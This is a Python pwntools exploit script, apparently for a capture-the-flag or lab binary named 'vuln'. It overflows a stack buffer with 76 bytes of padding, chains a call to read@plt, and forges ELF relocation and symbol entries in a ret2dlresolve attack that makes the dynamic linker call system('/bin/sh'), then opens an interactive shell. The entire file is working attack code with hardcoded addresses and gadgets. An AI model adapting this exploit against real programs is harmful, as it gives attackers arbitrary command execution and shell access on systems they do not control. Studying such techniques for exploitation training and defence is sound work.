from pwn import *
import core
import struct
elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
context.log_level = 'debug'

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=["/bin/sh"])

jmprel_address = 0x80482d8 # readelf -d ./vuln | grep "JMPREL"
symtab_address = 0x804820c # readelf -d ./vuln | grep "SYMTAB"
strtab_address = 0x804825c # readelf -d ./vuln | grep "STRTAB"
data_addr = core.get_data_addr(elf) # data for usage

dlpaydata = core.dlresolve_paydata("system", symtab_address, strtab_address, jmprel_address, data_addr)

print("symtab.stname : "+str(hex(dlpaydata.sym_struct.st_name)))
print("jmprel.r_offset : "+str(hex(dlpaydata.rel_struct.r_offset)))
print("jmprel.r_info : "+str(hex(dlpaydata.rel_struct.r_info)))

padding = 76
read_plt = 0x08049030
resolver = 0x08049030-16

payload1 = bytearray()
payload1 += ('A'*padding).encode()
payload1 += struct.pack("I", read_plt) # read@plt
payload1 += struct.pack("I", 0x0804921a) # ropgadget : pop edi; pop ebp; ret
payload1 += struct.pack("I", 0x00000000) # args[0] -> Null
payload1 += struct.pack("I", dlpaydata.DATA_ADDR) # args[1] -> Symbol name address (dlresolve.data_addr)
payload1 += struct.pack("I", resolver) # [plt_init] system(dlresolve.data_addr+36) so dlresolve.data_addr+36 is the argument that will use system when it will get executed
payload1 += struct.pack("I", dlpaydata.reloc_index) # reloc index (dlresolve.reloc_index)
payload1 += ("AAAA").encode() # return address (not important)
payload1 += struct.pack("I", dlpaydata.DATA_ADDR+36) # args[0] of system which will be written in the second payload (dlresolve.data_addr+36)

# like dlresolve_payload.payload
payload2 = bytearray()
# Write the symbol (system) to Symbol name addr
payload2 += dlpaydata.symbol_name
payload2 += b"A"*5
# SYMTAB (Elf32_Rel)
payload2 += struct.pack("I", dlpaydata.sym_struct.st_name)
payload2 += struct.pack("I", 0)*3
# JMPREL (Elf32_Sym)
payload2 += struct.pack("I", dlpaydata.rel_struct.r_offset)
payload2 += struct.pack("I", dlpaydata.rel_struct.r_info)
payload2 += b"/bin/sh\x00"

p.sendline(payload1)
p.sendline(payload2)

p.interactive()